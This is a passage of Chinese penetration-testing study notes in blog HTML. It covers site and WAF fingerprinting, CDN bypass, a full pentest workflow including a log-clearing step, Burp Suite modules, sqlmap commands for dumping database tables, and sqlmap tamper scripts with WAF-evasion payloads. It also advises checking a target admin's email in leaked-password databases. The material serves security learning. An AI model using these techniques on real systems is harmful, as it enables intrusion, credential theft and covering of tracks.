<p>cms识别：</p>
<p>​	国外识别平台：<a target="_blank" rel="noopener" href="https://whatcms.org/">https://whatcms.org/</a><br>
​	国内识别平台：<br>
​		bugscaner：<a target="_blank" rel="noopener" href="http://whatweb.bugscaner.com/">http://whatweb.bugscaner.com/</a><br>
​		whatweb：<a target="_blank" rel="noopener" href="https://www.whatweb.net/">https://www.whatweb.net/</a><br>
云悉：<a target="_blank" rel="noopener" href="https://www.yunsee.cn/">https://www.yunsee.cn/</a><br>
​    	潮汐：<a target="_blank" rel="noopener" href="http://finger.tidesec.net/">http://finger.tidesec.net/</a><br>
TSscan:<a target="_blank" rel="noopener" href="https://scan.dyboy.cn/web/">https://scan.dyboy.cn/web/</a></p>
<p>线下识别工具：</p>
<p>​	CMSMap：<a target="_blank" rel="noopener" href="https://github.com/Dionach/CMSmap">https://github.com/Dionach/CMSmap</a></p>
<p>​	EHole：<a target="_blank" rel="noopener" href="https://github.com/EdgeSecurityTeam/EHole">https://github.com/EdgeSecurityTeam/EHole</a></p>
<p>​	CMSeeK：<a target="_blank" rel="noopener" href="https://github.com/Tuhinshubhra/CMSeeK">https://github.com/Tuhinshubhra/CMSeeK</a></p>
<p>​	Whatweb（kali自带）</p>
<p>插件：</p>
<p>​	wappalyzer：<a target="_blank" rel="noopener" href="https://www.wappalyzer.com">https://www.wappalyzer.com</a><br>
​	whatruns：<a target="_blank" rel="noopener" href="https://www.whatruns.com/">https://www.whatruns.com/</a></p>
</li>
</ol>
<h4 id="操作系统层面"><a class="header-anchor" href="#操作系统层面">¶</a>操作系统层面</h4>
<ol>
<li>
<h5 id="OS判断："><a class="header-anchor" href="#OS判断：">¶</a><strong>OS判断</strong>：</h5>
<ol>
<li>
<p>TTL判断（不准确且可以修改误导）</p>
</li>
<li>
<p>Linux对大小写敏感，windows对大小写不敏感</p>
</li>
<li>
<p>Nmap系统指纹识别</p>
<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs x86asm">nmap -<span class="hljs-built_in">sS</span> -Pn -O <span class="hljs-built_in">ip</span><br>nmap -<span class="hljs-built_in">sS</span> -sV <span class="hljs-built_in">ip</span><br></code></pre></td></tr></table></figure>
</li>
</ol>
</li>
<li>
<h5 id="开放端口："><a class="header-anchor" href="#开放端口：">¶</a><strong>开放端口</strong>：</h5>
<p>在线端口扫描：<a target="_blank" rel="noopener" href="http://coolaf.com/tool/port">http://coolaf.com/tool/port</a></p>
<p>Nmap扫描</p>
</li>
<li>
<h5 id="中间件："><a class="header-anchor" href="#中间件：">¶</a><strong>中间件：</strong></h5>
<blockquote>
<p>IIS、Apache、Nginx、Tomcat、Weblogic、Jboss、WebSphere、Jetty…</p>
</blockquote>
<p>\1. HTTP相应数据包中查看Server字段   * BP抓包  * F12  * curl <a target="_blank" rel="noopener" href="http://www.baidu.com">http://www.baidu.com</a> -i &gt; ip.txt<br>
\2. 根据报错信息判断，访问为存在页面<br>
\3. 根据默认页面判断，“Welcome to nginx”<br>
\4. 通过端口服务探测，Tomcat/Jboss–&gt;8080端口   Weblogic–&gt;7001端口</p>
</li>
<li>
<h5 id="数据库"><a class="header-anchor" href="#数据库">¶</a><strong>数据库</strong></h5>
<p>数据库默认端口:<br>
SQl Server --&gt; 1433<br>
MySQL      --&gt; 3306<br>
Oracle     --&gt; 1521<br>
DB2        --&gt; 5000<br>
PostGreSQL --&gt; 5432<br>
MongoDB    --&gt; 27017<br>
Redis      --&gt; 6379</p>
</li>
<li>
<h5 id="WAF-防火墙识别"><a class="header-anchor" href="#WAF-防火墙识别">¶</a><strong>WAF/防火墙识别</strong></h5>
</li>
</ol>
<p>​	Nmap识别：</p>
<pre><code class="hljs">nmap -p 80,443 --script=http-waf-detect 目标主机
nmap -p 80,443 --script=http-waf-fingerprint 目标主机（精度更高）
</code></pre>
<p>​	Wafw00f：<a target="_blank" rel="noopener" href="https://github.com/enablesecurity/wafw00f">https://github.com/enablesecurity/wafw00f</a>	<br>
​	IdentYwaf：<a target="_blank" rel="noopener" href="https://github.com/stamparm/identywaf">https://github.com/stamparm/identywaf</a></p>
<p>​	看图识别WAF：<a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/3uUZKryCufQ_HcuMc8ZgQQ">https://mp.weixin.qq.com/s/3uUZKryCufQ_HcuMc8ZgQQ</a></p>
<ol start="6">
<li>
<h5 id="CDN识别与验证："><a class="header-anchor" href="#CDN识别与验证：">¶</a><strong>CDN识别与验证：</strong></h5>
<p>各地ping：</p>
<p>使用各种多地 ping 的服务，查看对应 IP 地址是否唯一，如果不唯一，多半是使用了CDN；</p>
<p>国内在线：<br>
CDN云观测：<a target="_blank" rel="noopener" href="http://cdn.chinaz.com/">http://cdn.chinaz.com/</a><br>
超级ping：<a target="_blank" rel="noopener" href="http://ping.chinaz.com/">http://ping.chinaz.com/</a><br>
爱站：<a target="_blank" rel="noopener" href="https://ping.aizhan.com/">https://ping.aizhan.com/</a><br>
17ce：<a target="_blank" rel="noopener" href="https://www.17ce.com/">https://www.17ce.com/</a></p>
</li>
</ol>
<p>​		国外在线：<br>
​			cdnplanet：<a target="_blank" rel="noopener" href="https://www.cdnplanet.com/tools/cdnfinder/">https://www.cdnplanet.com/tools/cdnfinder/</a><br>
​    		站长工具：<a target="_blank" rel="noopener" href="http://tool.chinaz.com/speedworld/">http://tool.chinaz.com/speedworld/</a><br>
ping：<a target="_blank" rel="noopener" href="http://www.ping.pe/">http://www.ping.pe/</a></p>
<p>​		Nslookup：</p>
<p>​		使用 nslookup 命令进行检测，原理同ping，如果返回域名解析对应多个 IP 地址多半是使用了 CDN；</p>
<h3 id="问题"><a class="header-anchor" href="#问题">¶</a>问题</h3>
<h4 id="终极问题：你如何进行信息收集？"><a class="header-anchor" href="#终极问题：你如何进行信息收集？">¶</a>终极问题：你如何进行信息收集？</h4>
<p>​		一般来说进行渗透测试都会拿到目标网站的一个根域名。首先我会根据根域名利用线上和线下工具对目标站点的子域名进行信息收集。线上通过如DNSDB、fofa、shodan、钟馗之眼、微步等进行查询，线下工具会利用Layer子域名挖掘机、oneforall以及kali自带的theHarvester进行子域名收集；然后通过一些工具去收集域名对应的真实IP，可能需要利用一些线上工具进行CDN绕过，拿到真实的IP之后对上面的开发的端口进行，看看都有哪些服务，然后利用dirsearch、wwwscan、御剑等工具对收集到域名进行目录扫描，去发现更多可能存在的路径，比如后台登录或者敏感配置文件路径如.git源码泄露；利用爱站、站长之家、探测一下该站点是否存在旁站，用Nmap、goby去收集真实的ip的c段信息，探测站点的指纹信息，收集一下CMS的版本信息，操作系统是win/linux，后端语言是java还是php等。还有就是收集一些资产信息，通过whois查询查找域名注册人、邮箱、电话等信息，如果可以定位到当前资产对于企业，还可以去企查查、天眼查、爱企查收集更多的关于企业的资产信息，比如该企业下运行的app，微信小程序等。</p>
<p><strong>渗透思路？</strong></p>
<p>零、获取授权</p>
<p>一、信息收集</p>
<ol>
<li>
<p>获取域名的 whois 信息 , 获取 注册者 邮箱 姓名 电话 等。</p>
</li>
<li>
<p>通过 DNS 域传送漏洞、备案号查询、SSl 证书、APP反编译、微信公众号、子域名在线查询、子域名挖掘机、DNS 历史记录、K8 C 段查询、Jsfinder、360 或华为威胁情报、证书序列号获取企业域名与 ip。</p>
</li>
<li>
<p>获取ip之后可以通过ping和超级ping的方式查看是否存在cdn和waf, cdn通过ping一个不存在的二级域名或者国外ping可以得到ip , waf的话通过一个叫wafwOOf的python脚本识别 , 然后再针对绕过</p>
</li>
<li>
<p>通过 7KB、破壳扫描网站目录结构，看看是否可以遍历目录，或者敏感文件泄漏，比如 php 探针、管理员备份文件。</p>
</li>
<li>
<p>google hack语法 进一步探测网站的信息，后台，敏感文件</p>
</li>
<li>
<p>敏感信息收集，如 github 源码、用 7kb、扫源代码泄露（.hg、.git、cvs、svn、.DS_store 源代码泄露）、google hack、接口信息泄露、社工信息泄露、邮箱地址信息收集、网盘搜索、钟馗之眼、天眼查、威胁情报、微步在线，js等</p>
</li>
<li>
<p>通过Wappalyzer、御剑工具、云悉指纹 、bugscan在线对网站指纹识别（包括，cms，cdn，证书等）</p>
</li>
<li>
<p>nmap扫描获取端口 , 获取真实ip</p>
</li>
<li>
<p>goby 扫描资产信息</p>
</li>
<li>
<p>通过 Nmap、Wappalyzer、御剑等查看服务器操作系统版本，web 中间件，看看是否存在已知的漏洞，比如 IIS，apache , nginx 的解析漏洞</p>
</li>
</ol>
<p>二、漏洞检测</p>
<ol>
<li>
<p>用 AWVS、appscan、长亭科技的 Xray 等扫描器检测 Web 漏洞，如 sql,xss,xxe 注入，代码执行，命令执行，目录读取，任意文件读取，下载，文件包含， 远程命令执行，弱口令，上传，编辑器漏洞，暴力破解等</p>
</li>
<li>
<p>用 namp、天镜、Nessus、极光等扫描系统 ip，对扫描出来的高危漏洞进行漏洞验证，如ms08- 067、ms17-010、ms12-020、ms15-035、ms19-0708、永恒之蓝 2 代、cve-2017-7494（samba）、cve-2014-6271(破壳)、php cgi 等相关漏洞验证。</p>
</li>
</ol>
<p>三、漏洞利用</p>
<p>利用各种nday和常见漏洞拿到  webshell或者其他权限</p>
<p>四、权限提升</p>
<p>windows和linux根据版本号系统漏洞提权，除此之外windows还可以利用计划任务等自启动劫持来提权，如果需要绕过uac可以uac提权，也可以令牌伪造提权；linux一般还可以sudo和suid提权，也可以通过计划任务等启动项劫持提权；</p>
<p>五、权限维持</p>
<p>六、日志清理</p>
<p>操作系统、中间件、数据库等日志进行清除</p>
<p>七、总结报告及修复方案</p>
<p>渗透测试报告一般包含高中危漏洞数量，存在漏洞的地址，漏洞的额复现过程，漏洞导致的危害，修复建议；</p>
<p><strong>敏感信息收集</strong></p>
<p>域名和⼦域名：收集⽬标⽹站的域名和⼦域名信息，可以使⽤WHOIS查询、DNS查找等⼯具。</p>
<p>IP地址和服务器信息：获取⽬标⽹站的IP地址、服务器类型和版本等信息，可以使⽤IP扫描⼯具、端</p>
<p>⼝扫描等⽅法。</p>
<p>⽹站⽬录和⽂件：查找⽹站中隐藏的⽬录和⽂件，包括备份⽂件、配置⽂件等。可以使⽤⽬录爆破⼯</p>
<p>具、Web爬⾍等。</p>
<p>员⼯信息：搜集与⽬标组织相关的员⼯信息，包括姓名、职位、联系⽅式等。可以使⽤搜索引擎、社</p>
<p>交媒体等途径。</p>
<p>敏感⽂件和配置信息：搜索⽹站中可能泄露的敏感⽂件，例如数据库备份、配置⽂件、敏感⽂档等。</p>
<p>可以使⽤搜索引擎、⽂件爆破⼯具等⽅式。</p>
<p>系统漏洞和补丁情况：了解⽬标系统的漏洞和补丁情况，可以使⽤漏洞扫描⼯具、安全公告等资源。</p>
<p>社会⼯程学信息：了解⽬标组织的员⼯、供应商、合作伙伴等信息，包括联系⽅式、社交活动等。可</p>
<p>以通过物理调查、社交媒体等⽅式收集。</p>
<p><strong>在渗透过程中，收集目标站注册人邮箱对我们有什么价值？</strong></p>
<p>丢社工库里看看有没有泄露密码，然后尝试用泄露的密码进行登录后台。用邮箱做关键词进行丢进搜索引擎。</p>
<p>利用搜索到的关联信息找出其他邮进而得到常用社交账号。</p>
<p>社工找出社交账号，里面或许会找出管理员设置密码的习惯 。利用已有信息生成专用字典。</p>
<p>观察管理员常逛哪些非大众性网站，拿下它，你会得到更多好东西</p>
<p><strong>怎么判断一个网站是否存在cdn , 以及绕过绕过方式？</strong></p>
<p>判断cdn</p>
<ol>
<li>
<p>通过nslookup可以查看 , 如果存在cdn的话 , 会有cdn的域名</p>
</li>
<li>
<p>通过超级ping , 不同地区如果返回的ip不一样, 说明存在cdn</p>
</li>
</ol>
<p>绕过cdn</p>
<ol>
<li>
<p>现在一般cdn都开启了泛域名解析 , 可以通过ping一个不存在的二级域名</p>
</li>
<li>
<p>通过DNS历史查询 , 查询是否存在部署cdn之前的域名解析记录</p>
</li>
<li>
<p>通过ssl证书查询真实ip</p>
</li>
<li>
<p>通过fofa 这种网路空间搜索引擎查询真实IP</p>
</li>
<li>
<p>通过网站的邮件订阅里面查看真实ip</p>
</li>
<li>
<p>通过国外服务器ping对方网站 , 一般不会在国外部署cdn</p>
</li>
</ol>
<h1>基础黑客工具的使用</h1>
<h2 id="BurpSuite"><a class="header-anchor" href="#BurpSuite">¶</a>BurpSuite</h2>
<h3 id="Burpsuite常用的模块"><a class="header-anchor" href="#Burpsuite常用的模块">¶</a>Burpsuite常用的模块</h3>
<p><strong>DashBoard模块(仪表盘)</strong></p>
<p><strong>Target模块(目标)</strong></p>
<p>Target 组件主要包含站点地图、目标域、Target工具三部分组成，他们帮助渗透测试人员更好地了解目标应用的整体状况、当前的工作涉及哪些目标域、分析可能存在的攻击面等信息</p>
<p><strong>Proxy模块(代理)</strong></p>
<p>是一个拦截HTTP/S的代理服务器，作为一个在浏览器和目标应用程序之间的中间人，允许你拦截，查看，修改在两个方向上的原始数据流。</p>
<p><strong>Intruder模块(入侵)</strong>：</p>
<p>可配置的工具，对web应用程序进行自动化攻击。此功能有多种用途，如漏洞利用、Web应用程序模糊测试、进行暴力破解等</p>
<p><strong>Repeater模块(重放)</strong></p>
<p>手动操作来触发单独的HTTP请求，并进行应用程序响应的工具。此功能用于根据不同的情况修改和发送相同的请求并分析，通过调整Request的参数，不断尝试，通过Response查看状态。从而节省在浏览器中操作的时间。</p>
<p><strong>Sequencer模块(序列器)</strong></p>
<p>Burp Sequencer是一种用于分析数据样本随机性质量的工具。可以用它测试程序的会话令牌(Session token)、密码重置令牌是否可预测等场景，通过Sequencer的数据样本分析，能够很好的降低这些关键数据被伪造的风险。 (2):Burp Sequencer主要由信息截取(Live Capture)、手动加载(Manual Load)和选项分析(Analysis Options)三个模块组成。 (3):在获取信息后，单击Load按钮加载信息，然后单击&quot;Analyze now&quot;按钮进行分析。</p>
<p><strong>Decoder模块(编码器)</strong></p>
<p>解码器是一个进行手动执行或对应用程序数据者智能解码编码的工具。此功能可用于解码数据找回原来的数据形式，或者进行编码和数据加密。</p>
<p><strong>Comparper模块(对比器)</strong></p>
<p>Burp Comparer在Burp中主要提供一个可视化的差异比对功能，来对比分析两次数据之间的区别，使用的场合有: 枚举用户名的过程，对比分析登录和失败时，服务器端返回结果的区别 使用Intruder进行攻击时，对于不同的服务器端响应，可以很快分析出两次响应的区别在哪里 进行SQL注入的盲注测试时，比较两次响应的差异，判断响应结果与注入条件的关联关系。</p>
<p>(2):使用Comparer时有两个步骤:第一步是加载数据，第二步是差异分析。</p>
<p>(3):Comparer数据加载的常用方式如下: 从其他Burp工具通过上下文菜单转发过来 直接粘贴 从文件里加载。</p>
<p><strong>Extender模块(扩展)</strong></p>
<p>可以让你加载Burp Suit的扩展，使用你自己的或第三方代码来扩展Burp Suit的功能!</p>
<p><strong>Project options(全局参数设置)</strong></p>
<p>在Burp Suite中，存在一些粗粒度的设置，这些设置选项，一旦设置了将会对Burp Suite的整 体产生效果，这就是Options面板。当我们打开Options面板即可看到，它是由 Connections、HTTP、SSL、Sessions、Display、Misc六个选项卡组成。</p>
<h2 id="NMAP"><a class="header-anchor" href="#NMAP">¶</a>NMAP</h2>
<p>可以看我博客的另一篇文章《nmap与sqlmap常用参数》😛</p>
<h2 id="SQLMAP"><a class="header-anchor" href="#SQLMAP">¶</a>SQLMAP</h2>
<p><strong>信息收集</strong></p>
<figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs jboss-cli"><span class="hljs-comment"># 查看数据库相关信息：</span><br>	<span class="hljs-params">--current-user</span>  	枚举当前用户<br>	<span class="hljs-params">--current-db</span>  	  枚举当前数据库<br>	<span class="hljs-params">--dbs</span>	      		  枚举可用的数据库<br>	<span class="hljs-params">--is-dba</span>	      	枚举数据库权限<br>	<span class="hljs-params">--passwords</span>		    枚举数据库用户密码<br>  <span class="hljs-params">--is-dba</span>          检测当前网站连接数据的用户是否是为DBA<br><br><span class="hljs-comment"># 指纹识别：</span><br>	-f/<span class="hljs-params">--fingerprint</span> 	执行检查广泛的DBMS版本指纹<br>	-b/<span class="hljs-params">--banner</span>			  检测数据库指纹<br>	<span class="hljs-params">--hostname</span>			  枚举主机名称<br><br><span class="hljs-comment"># Waf识别：</span><br>	<span class="hljs-params">--identify-waf</span>	  检测waf信息<br><br><span class="hljs-comment"># 当url有多个参数值时：</span><br>	-p 参数		<span class="hljs-comment">#当显示302重定向时可以添加Cookie值进行扫描</span><br><br><span class="hljs-comment"># 指定Cookie进行扫描：</span><br>	<span class="hljs-params">--cookie=</span><span class="hljs-string">&quot;Cookie值&quot;</span>		<span class="hljs-comment">#当需要登录时才可以扫描出漏洞</span><br></code></pre></td></tr></table></figure>
<p><strong>常规注入</strong></p>
<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><code class="hljs stylus">注入方式<br>sqlmap -u	url	            指定目标url跑<br>sqlmap -r head<span class="hljs-selector-class">.txt</span>			抓包指定header头信息跑.-r指定文件<br><br>跑数据：<br>	 <span class="hljs-attr">--dbs</span>		跑数据库<br>	 -D			指定数据库<br><br>	 <span class="hljs-attr">--tables</span>	跑表名<br>	 -T			指定表名<br><br>	 <span class="hljs-attr">--columns</span>	跑字段<br>	 -C			指定字段<br><br>	 <span class="hljs-attr">--dump</span>		提取数据<br>	 <span class="hljs-attr">--count</span>	获取表的数量<br>	 <br>组合参数：<br><br>	<span class="hljs-attr">--batch</span> 		   batch：自动选yes。 自动应答SQLMap所提出的配置选项<br>	<span class="hljs-attr">--banner</span>		   查看数据库版本信息（老师那边删除了）<br>	 -smart			   启发式快速判断，节约时间。<br>	<span class="hljs-attr">--flush-session</span>    清空session缓存，重新扫描该目标<br>	-z flu			   缩写，忘记可短写，删除缓存<br>	<span class="hljs-attr">--random-agent</span>	   随机请求头<br>	<span class="hljs-attr">--user-agent</span>=<span class="hljs-string">&quot;某请求头&quot;</span>		            指定某请求头<br>  <span class="hljs-attr">--proxy</span> http:<span class="hljs-comment">//127.0.0.1:8080           设置指定的代理</span><br><br>	<span class="hljs-attr">--threads</span> x		设置测试线程数(<span class="hljs-number">1</span>-<span class="hljs-number">10</span>)，默认线程<span class="hljs-number">1</span>,可以自己改大的线程<br>	<span class="hljs-attr">--risk</span> x		执行的风险等级，(<span class="hljs-number">1</span>-<span class="hljs-number">3</span>)默认为<span class="hljs-number">1</span>会测试大部分语句，<span class="hljs-number">2</span>会增加基于事件的测试语句，<span class="hljs-number">3</span>会增加or语句的SQL注入测试<br><br>案例:<br><br> python sqlmap<span class="hljs-selector-class">.py</span> -u <span class="hljs-string">&quot;&quot;</span> <span class="hljs-attr">--dbs</span>   <span class="hljs-comment">//获取到所有的数据名</span><br> python sqlmap<span class="hljs-selector-class">.py</span> -u <span class="hljs-string">&quot;&quot;</span> <span class="hljs-attr">--tables</span> -D security  <span class="hljs-comment">//获取到security数据库下的所有表名</span><br> python sqlmap<span class="hljs-selector-class">.py</span> -u <span class="hljs-string">&quot;&quot;</span> <span class="hljs-attr">--columns</span> -T users -D security  <span class="hljs-comment">//获取到security数据库、users表下的所有字段名</span><br> python sqlmap<span class="hljs-selector-class">.py</span> -u <span class="hljs-string">&quot;&quot;</span> <span class="hljs-attr">--dump</span> -C <span class="hljs-string">&quot;username,id,password&quot;</span> -T users -D security  <br> <span class="hljs-comment">//获取到security数据库、users表下username,id,password这三个字段的内容</span><br><br>BP获取SQL注入的数据:<br> <br> <span class="hljs-number">1</span>.开启BP并打开监听<br> <span class="hljs-number">2</span>.使用SQLMAP进行注入并进行（这个地方出现了问题，BP没有抓到包,原因是<span class="hljs-attr">--proxy</span>后面加了等号）<br> 用这个：python sqlmap<span class="hljs-selector-class">.py</span> -u <span class="hljs-string">&quot;&quot;</span> <span class="hljs-attr">--random-agent</span> <span class="hljs-attr">--batch</span><br></code></pre></td></tr></table></figure>
<p><strong>Tamper脚本</strong></p>
<figure class="highlight mel"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br></pre></td><td class="code"><pre><code class="hljs mel">● SQLMAP使用脚本绕过  <br>  ○ sqlmap.py -u- url --tamper “脚本名称.py” <br>● SQLMAP常见绕过脚本（部分）<br>apostrophemask.py<br>适用数据库：ALL 作用：将引号替换为utf<span class="hljs-number">-8</span>，用于过滤单引号 使用脚本前：tamper(<span class="hljs-string">&quot;1 AND &#x27;1&#x27;=&#x27;1&quot;</span>) 使用脚本后：<span class="hljs-number">1</span> AND %EF%BC%871%EF%BC%87=%EF%BC%871<br><br>base64encode.py<br>适用数据库：ALL 作用：替换为base64编码 使用脚本前：tamper(<span class="hljs-string">&quot;1&#x27; AND SLEEP(5)#&quot;</span>) 使用脚本后：MScgQU5EIFNMRUVQKDUpIw==<br><br>multiplespaces.py<br>适用数据库：ALL 作用：围绕sql关键字添加多个空格 使用脚本前：tamper(<span class="hljs-string">&#x27;1 UNION SELECT foobar&#x27;</span>) 使用脚本后：<span class="hljs-number">1</span> UNION SELECT foobar<br><br>space2plus.py<br>适用数据库：ALL 作用：用加号替换空格 使用脚本前：tamper(<span class="hljs-string">&#x27;SELECT id FROM users&#x27;</span>) 使用脚本后：SELECT+id+FROM+users<br><br>nonrecursivereplacement.py<br>适用数据库：ALL 作用：作为双重查询语句，用双重语句替代预定义的sql关键字（适用于非常弱的自定义过滤器，例如将<span class="hljs-keyword">select</span>替换为空） 使用脚本前：tamper(<span class="hljs-string">&#x27;1 UNION SELECT 2--&#x27;</span>) 使用脚本后：<span class="hljs-number">1</span> UNIOUNIONN SELESELECTCT <span class="hljs-number">2</span>--<br><br>space2randomblank.py<br>适用数据库：ALL 作用：将空格替换为其他有效字符 使用脚本前：tamper(<span class="hljs-string">&#x27;SELECT id FROM users&#x27;</span>) 使用脚本后：SELECT%0Did%0DFROM%0Ausers<br><br>unionalltounion.py<br>适用数据库：ALL 作用：将union allselect 替换为unionselect 使用脚本前：tamper(<span class="hljs-string">&#x27;-1 UNION ALL SELECT&#x27;</span>) 使用脚本后：<span class="hljs-number">-1</span> UNION SELECT<br><br>securesphere.py<br>适用数据库：ALL 作用：追加特定的字符串 使用脚本前：tamper(<span class="hljs-string">&#x27;1 AND 1=1&#x27;</span>) 使用脚本后：<span class="hljs-number">1</span> AND <span class="hljs-number">1</span>=<span class="hljs-number">1</span> and <span class="hljs-string">&#x27;0having&#x27;</span>=<span class="hljs-string">&#x27;0having&#x27;</span><br><br>space2dash.py<br>适用数据库：ALL 作用：将空格替换为--，并添加一个随机字符串和换行符 使用脚本前：tamper(<span class="hljs-string">&#x27;1 AND 9227=9227&#x27;</span>) 使用脚本后：<span class="hljs-number">1</span>--nVNaVoPYeva%0AAND--ngNvzqu%0A9227=<span class="hljs-number">9227</span><br><br>space2mssqlblank.py<br>适用数据库：Microsoft SQL Server 测试通过数据库：Microsoft SQL Server <span class="hljs-number">2000</span>、Microsoft SQL Server <span class="hljs-number">2005</span> 作用：将空格随机替换为其他空格符号(<span class="hljs-string">&#x27;%01&#x27;</span>, <span class="hljs-string">&#x27;%02&#x27;</span>, <span class="hljs-string">&#x27;%03&#x27;</span>, <span class="hljs-string">&#x27;%04&#x27;</span>, <span class="hljs-string">&#x27;%05&#x27;</span>, <span class="hljs-string">&#x27;%06&#x27;</span>, <span class="hljs-string">&#x27;%07&#x27;</span>, <span class="hljs-string">&#x27;%08&#x27;</span>, <span class="hljs-string">&#x27;%09&#x27;</span>, <span class="hljs-string">&#x27;%0B&#x27;</span>, <span class="hljs-string">&#x27;%0C&#x27;</span>, <span class="hljs-string">&#x27;%0D&#x27;</span>, <span class="hljs-string">&#x27;%0E&#x27;</span>, <span class="hljs-string">&#x27;%0F&#x27;</span>, <span class="hljs-string">&#x27;%0A&#x27;</span>) 使用脚本前：tamper(<span class="hljs-string">&#x27;SELECT id FROM users&#x27;</span>) 使用脚本后：SELECT%0Eid%0DFROM%07users<br><br>between.py<br>测试通过数据库：Microsoft SQL Server <span class="hljs-number">2005</span>、MySQL <span class="hljs-number">4</span>, <span class="hljs-number">5.0</span> and <span class="hljs-number">5.5</span>、Oracle <span class="hljs-number">10</span>g、PostgreSQL <span class="hljs-number">8.3</span>, <span class="hljs-number">8.4</span>, <span class="hljs-number">9.0</span> 作用：用NOT BETWEEN <span class="hljs-number">0</span> AND #替换&gt; 使用脚本前：tamper(<span class="hljs-string">&#x27;1 AND A &gt; B--&#x27;</span>) 使用脚本后：<span class="hljs-number">1</span> AND A NOT BETWEEN <span class="hljs-number">0</span> AND B--<br><br>percentage.py<br>适用数据库：ASP 测试通过数据库：Microsoft SQL Server <span class="hljs-number">2000</span>, <span class="hljs-number">2005</span>、MySQL <span class="hljs-number">5.1</span><span class="hljs-number">.56</span>, <span class="hljs-number">5.5</span><span class="hljs-number">.11</span>、PostgreSQL <span class="hljs-number">9.0</span> 作用：在每个字符前添加一个% 使用脚本前：tamper(<span class="hljs-string">&#x27;SELECT FIELD FROM TABLE&#x27;</span>) 使用脚本后：%S%E%L%E%C%T %F%I%E%L%D %F%R%O%M %T%A%B%L%E<br><br>sp_password.py<br>适用数据库：MSSQL 作用：从T-SQL日志的自动迷糊处理的有效载荷中追加sp_password 使用脚本前：tamper(<span class="hljs-string">&#x27;1 AND 9227=9227-- &#x27;</span>) 使用脚本后：<span class="hljs-number">1</span> AND <span class="hljs-number">9227</span>=<span class="hljs-number">9227</span>-- sp_password<br><br>charencode.py<br>测试通过数据库：Microsoft SQL Server <span class="hljs-number">2005</span>、MySQL <span class="hljs-number">4</span>, <span class="hljs-number">5.0</span> and <span class="hljs-number">5.5</span>、Oracle <span class="hljs-number">10</span>g、PostgreSQL <span class="hljs-number">8.3</span>, <span class="hljs-number">8.4</span>, <span class="hljs-number">9.0</span> 作用：对给定的payload全部字符使用url编码（不处理已经编码的字符） 使用脚本前：tamper(<span class="hljs-string">&#x27;SELECT FIELD FROM%20TABLE&#x27;</span>) 使用脚本后：%53%45%4C%45%43%54%20%46%49%45%4C%44%20%46%52%4F%4D%20%54%41%42%4C%45<br><br>randomcase.py<br>测试通过数据库：Microsoft SQL Server <span class="hljs-number">2005</span>、MySQL <span class="hljs-number">4</span>, <span class="hljs-number">5.0</span> and <span 